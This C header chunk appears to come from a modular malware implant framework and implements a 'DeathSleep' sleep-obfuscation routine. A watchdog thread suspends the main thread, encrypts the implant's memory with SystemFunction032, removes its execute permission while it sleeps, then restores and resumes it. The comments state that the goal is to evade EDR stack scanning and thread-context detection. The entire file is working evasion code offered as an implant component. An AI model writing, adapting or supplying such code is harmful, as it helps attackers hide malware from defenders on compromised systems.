// chunk: evasion/sleep_deathsleep
// depends: (none)
// provides: ekko_sleep
// headers: windows.h
// risk: medium
// note: DeathSleep — main thread enters suspended wait while a watchdog thread handles the encrypt-sleep-decrypt cycle. During sleep the main thread has no active frames for EDR stack scanning. Riskier than timer-based approaches but defeats thread-context-based detection.

#ifndef CHUNK_SLEEP_DEATHSLEEP
#define CHUNK_SLEEP_DEATHSLEEP

typedef NTSTATUS (NTAPI *pfnSystemFunction032_ds)(
    struct { ULONG Length; ULONG MaximumLength; PUCHAR Buffer; } *data,
    struct { ULONG Length; ULONG MaximumLength; PUCHAR Buffer; } *key
);

static volatile int g_deathsleep_initialized = 0;
static pfnSystemFunction032_ds g_ds_SF032 = NULL;

static int deathsleep_init(void) {
    if (g_deathsleep_initialized) return 1;

    HMODULE advapi = LoadLibraryA("advapi32.dll");
    if (!advapi) return 0;

    g_ds_SF032 = (pfnSystemFunction032_ds)GetProcAddress(advapi, "SystemFunction032");
    if (!g_ds_SF032) return 0;

    g_deathsleep_initialized = 1;
    return 1;
}

static void ds_crypt_region(BYTE *addr, DWORD size, BYTE *key, DWORD key_len) {
    struct { ULONG Length; ULONG MaximumLength; PUCHAR Buffer; } data_blob;
    struct { ULONG Length; ULONG MaximumLength; PUCHAR Buffer; } key_blob;

    data_blob.Buffer = addr;
    data_blob.Length = data_blob.MaximumLength = size;
    key_blob.Buffer = key;
    key_blob.Length = key_blob.MaximumLength = key_len;

    g_ds_SF032(&data_blob, &key_blob);
}

typedef struct {
    BYTE *base;
    DWORD size;
    DWORD sleep_ms;
    HANDLE main_thread;
    HANDLE resume_event;
    BYTE key[16];
} ds_ctx_t;

static DWORD WINAPI ds_watchdog(LPVOID param) {
    ds_ctx_t *ctx = (ds_ctx_t *)param;

    // Suspend the main thread — it becomes invisible to stack scanners
    SuspendThread(ctx->main_thread);

    // Encrypt the implant region
    ds_crypt_region(ctx->base, ctx->size, ctx->key, sizeof(ctx->key));

    // Remove execute permission
    DWORD old;
    VirtualProtect(ctx->base, ctx->size, PAGE_READWRITE, &old);

    // Sleep the requested duration
    Sleep(ctx->sleep_ms);

    // Restore executable permission
    DWORD dummy;
    VirtualProtect(ctx->base, ctx->size, PAGE_EXECUTE_READWRITE, &dummy);

    // Decrypt the implant region
    ds_crypt_region(ctx->base, ctx->size, ctx->key, sizeof(ctx->key));

    // Restore original protection
    VirtualProtect(ctx->base, ctx->size, PAGE_EXECUTE_READ, &dummy);

    // Resume the main thread
    ResumeThread(ctx->main_thread);

    // Signal completion
    SetEvent(ctx->resume_event);

    return 0;
}

static void ekko_sleep(DWORD ms, BYTE *base, DWORD size) {
    if (!g_deathsleep_initialized && !deathsleep_init()) {
        Sleep(ms);
        return;
    }

    ds_ctx_t ctx;
    ctx.base = base;
    ctx.size = size;
    ctx.sleep_ms = ms;
    ctx.resume_event = CreateEventA(NULL, FALSE, FALSE, NULL);
    if (!ctx.resume_event) { Sleep(ms); return; }

    // Get a real handle to current thread (not pseudo-handle)
    if (!DuplicateHandle(GetCurrentProcess(), GetCurrentThread(),
                         GetCurrentProcess(), &ctx.main_thread,
                         THREAD_SUSPEND_RESUME, FALSE, 0)) {
        CloseHandle(ctx.resume_event);
        Sleep(ms);
        return;
    }

    // Generate per-sleep random key
    DWORD tick = GetTickCount();
    for (int i = 0; i < 16; i++)
        ctx.key[i] = (BYTE)((tick >> (i % 4 * 8)) ^ (i * 0x91 + 0x2D));

    // Launch watchdog — it will suspend us, encrypt, sleep, decrypt, resume us
    HANDLE hWatchdog = CreateThread(NULL, 0, ds_watchdog, &ctx, 0, NULL);
    if (!hWatchdog) {
        CloseHandle(ctx.main_thread);
        CloseHandle(ctx.resume_event);
        Sleep(ms);
        return;
    }

    // Main thread waits — watchdog suspends us before we block here,
    // so we actually get suspended. When resumed, the event is already set.
    WaitForSingleObject(ctx.resume_event, ms + 30000);

    WaitForSingleObject(hWatchdog, 5000);
    CloseHandle(hWatchdog);
    CloseHandle(ctx.main_thread);
    CloseHandle(ctx.resume_event);
    SecureZeroMemory(ctx.key, sizeof(ctx.key));
}

#endif
